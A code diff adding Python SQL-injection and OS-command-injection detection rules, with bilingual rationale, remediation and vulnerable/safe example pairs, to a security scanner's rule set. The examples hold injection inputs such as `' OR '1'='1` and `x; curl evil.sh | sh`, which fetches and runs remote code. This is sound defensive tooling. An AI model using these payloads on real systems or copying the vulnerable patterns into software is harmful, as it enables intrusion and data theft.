@@ -150,6 +150,39 @@ export const SOURCE_RULES = [
     ],
   },
   {
+    id: "PG-SQL-006",
+    title: "SQL built from dynamic strings in Python DB-API, SQLAlchemy text() or Django raw SQL",
+    category: "injection",
+    defaultSeverity: "high",
+    scope: "code",
+    languages: ["python"],
+    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
+    rationale: {
+      en: "When request data (a Flask `request.args`, a Django `request.GET`, a FastAPI route parameter) is formatted into the SQL passed to `cursor.execute()`, SQLAlchemy `text()`, Django `.raw()`, `.extra()` or `RawSQL`, an attacker can close the string literal and add conditions such as `' OR '1'='1` or a `UNION SELECT`. That reads other rows and tables, skips a login check and, with stacked statements, changes data. `%`, `+`, `.format()` and f-strings all paste the value into the SQL text.",
+      ko: "요청 데이터(Flask `request.args`, Django `request.GET`, FastAPI 라우트 매개변수)를 `cursor.execute()`, SQLAlchemy `text()`, Django `.raw()`·`.extra()`·`RawSQL`에 넘기는 SQL 문자열에 포맷하면, 공격자가 문자열 리터럴을 닫고 `' OR '1'='1`이나 `UNION SELECT` 같은 조건을 덧붙일 수 있습니다. 그러면 다른 행과 테이블을 읽고 로그인 확인을 건너뛰며, 여러 문장을 허용하면 데이터도 바꿀 수 있습니다. `%`, `+`, `.format()`, f-string은 모두 값을 SQL 문자열에 그대로 붙입니다.",
+    },
+    remediation: {
+      en: "Keep the SQL text constant and pass the values as the second argument: `cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))` (`?` for sqlite3), `session.execute(text('... WHERE id = :id'), {'id': user_id})`, and `Model.objects.raw('... WHERE id = %s', [user_id])` in Django. Never put `%` or an f-string around the value yourself. Table and column names cannot be bound, so pick them from a fixed allowlist (a dict lookup, or `psycopg2.sql.Identifier`) instead of using input directly.",
+      ko: "SQL 문자열은 고정해 두고 값은 두 번째 인자로 전달하세요: `cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))`(sqlite3는 `?`), `session.execute(text('... WHERE id = :id'), {'id': user_id})`, Django는 `Model.objects.raw('... WHERE id = %s', [user_id])`. 값을 `%`나 f-string으로 직접 끼워 넣지 마세요. 테이블 이름과 컬럼 이름은 바인딩할 수 없으므로 입력을 그대로 쓰지 말고 고정된 허용 목록(allowlist: dict 조회나 `psycopg2.sql.Identifier`)에서 고르세요.",
+    },
+    examples: [
+      {
+        language: "python",
+        vulnerable: "cursor.execute(f\"SELECT * FROM users WHERE name = '{name}'\")",
+        safe: 'cursor.execute("SELECT * FROM users WHERE name = %s", (name,))',
+        note: {
+          en: "`name` set to `' OR '1'='1` returns every user in the first form and nothing in the second.",
+          ko: "`name`이 `' OR '1'='1`이면 첫 번째 코드는 모든 사용자를 반환하고 두 번째 코드는 아무것도 반환하지 않습니다.",
+        },
+      },
+      {
+        language: "python",
+        vulnerable: "User.objects.raw(\"SELECT * FROM auth_user WHERE username = '%s'\" % name)",
+        safe: 'User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [name])',
+      },
+    ],
+  },
+  {
     id: "PG-SQL-007",
     title: "SQL built from dynamic strings in PHP (mysqli, PDO, Laravel, Doctrine)",
     category: "injection",
@@ -366,6 +399,39 @@ export const SOURCE_RULES = [
         language: "kotlin",
         vulnerable: 'ProcessBuilder("sh", "-c", "convert $file out.png").start()',
         safe: 'ProcessBuilder("convert", "--", file, "out.png").start()',
+      },
+    ],
+  },
+  {
+    id: "PG-CMD-004",
+    title: "OS command built from dynamic strings in Python (os.system, subprocess, os.popen)",
+    category: "command_execution",
+    defaultSeverity: "high",
+    scope: "code",
+    languages: ["python"],
+    standards: { owasp: ["A05:2025"], cwe: ["CWE-78"], cert: [] },
+    rationale: {
+      en: "Request data (a Flask `request.args`, a Django `request.GET`, a FastAPI route parameter) in the string for `os.system()`, `os.popen()`, `subprocess.*(..., shell=True)` or the script of `sh -c` lets an attacker append commands with `;`, `&&` or `$(...)` and run them as the server. As the program of a list it chooses what runs. In a fixed program's argument list there is no shell, but a value like `--output=out.txt` is still read as an option (argument injection).",
+      ko: "요청 데이터(Flask `request.args`, Django `request.GET`, FastAPI 라우트 매개변수)가 `os.system()`, `os.popen()`, `subprocess.*(..., shell=True)`의 명령 문자열이나 `sh -c`의 스크립트에 들어가면 공격자가 `;`, `&&`, `$(...)`로 명령을 덧붙여 서버의 권한으로 실행시킬 수 있습니다. 리스트의 프로그램 자리에 들어가면 무엇이 실행될지 공격자가 정합니다. 프로그램이 고정된 인자 리스트에서는 셸이 없지만, `--output=out.txt` 같은 값이 옵션으로 해석됩니다(인자 주입).",
+    },
+    remediation: {
+      en: "Do not build a command string. Call the program directly with a fixed name and one list item per value, without `shell=True`: `subprocess.run(['git', 'log', '--end-of-options', ref, '--'], check=True)`. Never put input in the script of `sh -c`. Check each argument against an allowlist and mark where options end (`--end-of-options` for git 2.24+, or `--`) so a user value is not read as an option. A Python library (zipfile, Pillow, socket.gethostbyname) avoids the process altogether.",
+      ko: "명령 문자열을 만들지 마세요. `shell=True` 없이 고정된 프로그램 이름과 값마다 하나의 리스트 항목으로 직접 호출합니다: `subprocess.run(['git', 'log', '--end-of-options', ref, '--'], check=True)`. 입력을 넣은 `sh -c`는 쓰지 마세요. 인자는 허용 목록(allowlist)으로 검증하고, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 또는 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요. 압축(zipfile), 이미지 처리(Pillow), DNS 조회(socket.gethostbyname) 같은 작업은 Python 라이브러리를 쓰면 프로세스 실행 자체를 피할 수 있습니다.",
+    },
+    examples: [
+      {
+        language: "python",
+        vulnerable: 'os.system("ping -c 1 " + host)',
+        safe: 'if not re.fullmatch(r"[A-Za-z0-9.-]+", host):\n    abort(400)\nsubprocess.run(["ping", "-c", "1", host], check=True)',
+        note: {
+          en: "`host` set to `x; curl evil.sh | sh` runs the second command in the first form; the second form passes it to `ping` as one argument.",
+          ko: "`host`가 `x; curl evil.sh | sh`이면 첫 번째 코드는 두 번째 명령까지 실행하고, 두 번째 코드는 값 전체를 `ping`의 인자 하나로만 넘깁니다.",
+        },
+      },
+      {
+        language: "python",
+        vulnerable: 'subprocess.run(f"gzip -k {name}", shell=True)',
+        safe: 'subprocess.run(["gzip", "-k", "--", name], check=True)',
       },
     ],
   },
@@ -656,6 +722,11 @@ export const MYBATIS_RULE_IDS: SourceRuleId[] = ["PG-SQL-005"];
 /** Rules that run on Java and Kotlin sources. */
 export const JVM_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
   rule.languages.some((language: RuleLanguage) => language === "java" || language === "kotlin"),
+).map((rule) => rule.id);
+
+/** Rules that run on Python sources. */
+export const PYTHON_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
+  rule.languages.some((language: RuleLanguage) => language === "python"),
 ).map((rule) => rule.id);
 
 /** Rules that run on PHP sources. */
